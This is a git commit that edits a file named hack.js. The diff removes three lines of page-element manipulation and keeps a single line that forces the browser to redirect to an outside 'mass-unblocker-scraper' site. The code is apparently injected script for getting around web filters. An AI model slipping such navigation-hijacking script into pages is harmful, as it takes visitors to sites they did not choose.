cac98ada1ead8b3eeb8c540481dd51a0e6a40b51
Crazystuffxyz <125907466+crazystuffxyz@users.noreply.github.com>
2025-04-13 11:42:54 -0400

    Update hack.js

--- hack.js
+++ hack.js
@@ -1,4 +1,1 @@
-var image = document.querySelector("#qswerftgyhujhtgrfewsderftgyhu");
-var script = document.currentScript;
-image.outerHTML = script.id;
 location.href = "https://mass-unblocker-scraper-v2.onrender.com";
